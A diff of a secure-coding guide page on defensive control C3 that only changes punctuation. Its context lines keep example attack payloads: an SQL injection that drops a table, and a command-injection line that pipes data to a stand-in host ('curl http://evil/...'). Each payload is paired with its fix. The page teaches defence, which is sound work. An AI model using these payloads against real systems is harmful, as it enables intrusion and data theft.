@@ -8,9 +8,9 @@
 
 ## What This Control Defends Against
 
-> **⚠️ EDUCATIONAL PURPOSE ONLY** — the attack examples below are shown so you understand exactly what C3 prevents, and can find and fix these issues in systems you own or are authorised to test.
+> **⚠️ EDUCATIONAL PURPOSE ONLY** - the attack examples below are shown so you understand exactly what C3 prevents, and can find and fix these issues in systems you own or are authorised to test.
 
-C3 is a defensive control, so its "attack vectors" are really the **threats it addresses**. Almost all of them share one root cause: **untrusted input reaches an interpreter that treats part of it as code**—a SQL engine, an HTML renderer, a shell, an LDAP directory, an XML parser, or a deserializer. The final threat, poor exception handling, is what turns a contained error into an information leak or an access-control bypass.
+C3 is a defensive control, so its "attack vectors" are really the **threats it addresses**. Almost all of them share one root cause: **untrusted input reaches an interpreter that treats part of it as code**-a SQL engine, an HTML renderer, a shell, an LDAP directory, an XML parser, or a deserializer. The final threat, poor exception handling, is what turns a contained error into an information leak or an access-control bypass.
 
 For each threat below you will see the *insecure* pattern that lets it in, an example payload, and the C3 element that shuts it down. The implementation details live on the [How to Implement](prevention.md) and [Code Examples](examples.md) pages.
 
@@ -30,7 +30,7 @@ Query:  SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
 ```
 
 **Payoff**: authentication bypass, dumping or modifying the whole database, sometimes command execution on the DB host.
-**C3 fix**: parameterised queries / prepared statements / a safe ORM — the data is sent to the database separately from the command and can never alter it.
+**C3 fix**: parameterised queries / prepared statements / a safe ORM - the data is sent to the database separately from the command and can never alter it.
 
 ### 2. NoSQL Injection
 
@@ -63,7 +63,7 @@ Runs:   ping -c 1 127.0.0.1 && curl http://evil/<attacker exfil>
 ```
 
 **Payoff**: arbitrary command execution, full host compromise, data exfiltration.
-**C3 fix**: avoid the shell entirely—call the program with an argument array (no shell interpretation)—and allow-list the acceptable input (e.g. a valid IP/hostname).
+**C3 fix**: avoid the shell entirely-call the program with an argument array (no shell interpretation)-and allow-list the acceptable input (e.g. a valid IP/hostname).
 
 ### 4. LDAP Injection
 
@@ -182,7 +182,7 @@ HTTP/1.1 500 Internal Server Error
 }
 ```
 
-**Payoff**: exact framework/DB versions, file paths, schema, internal hostnames, sometimes live credentials—a complete map for the next step, and confirmation that an injection point exists.
+**Payoff**: exact framework/DB versions, file paths, schema, internal hostnames, sometimes live credentials-a complete map for the next step, and confirmation that an injection point exists.
 **C3 fix**: return a generic message plus a correlation id; log the detail server-side only.
 
 ### 11. Fail-Open on Error (Security Bypass)
@@ -199,7 +199,7 @@ grant_access()                        # attacker only needs to make the check cr
 ```
 
 **Payoff**: authentication/authorization bypass triggered simply by forcing an exception (oversized input, malformed token, dependency timeout).
-**C3 fix**: fail closed—any exception during a security decision must result in denial.
+**C3 fix**: fail closed-any exception during a security decision must result in denial.
 
 ## How Each Threat Is Neutralised
 
@@ -217,15 +217,15 @@ grant_access()                        # attacker only needs to make the check cr
 | 10 | Verbose error disclosure | Raw exceptions to client | Generic errors + server-side logging |
 | 11 | Fail-open bypass | Errors treated as "allow" | Fail closed on every security check |
 
-> **Remember the central rule:** for injection and XSS, input validation *reduces* the surface but does not close it. The threat is actually neutralised at the sink—by parameterisation and context-aware encoding. Do both.
+> **Remember the central rule:** for injection and XSS, input validation *reduces* the surface but does not close it. The threat is actually neutralised at the sink-by parameterisation and context-aware encoding. Do both.
 
 ## Key Takeaways
 
-1. **One root cause, many names** — injection, XSS, XXE, traversal, and deserialization are all untrusted input reaching an interpreter.
-2. **The real fix lives at the sink** — parameterise queries and encode output for the exact context; validation alone is not enough.
-3. **Types and allow-lists stop whole families** — enforcing "a username is a short string" defeats NoSQL operator injection outright.
-4. **Errors are an attack surface too** — verbose exceptions leak the map; fail-open exceptions hand over the keys.
-5. **Fail closed, log privately** — deny on error and keep the detail out of the client's hands.
+1. **One root cause, many names** - injection, XSS, XXE, traversal, and deserialization are all untrusted input reaching an interpreter.
+2. **The real fix lives at the sink** - parameterise queries and encode output for the exact context; validation alone is not enough.
+3. **Types and allow-lists stop whole families** - enforcing "a username is a short string" defeats NoSQL operator injection outright.
+4. **Errors are an attack surface too** - verbose exceptions leak the map; fail-open exceptions hand over the keys.
+5. **Fail closed, log privately** - deny on error and keep the detail out of the client's hands.
 
 ## Next Steps
 
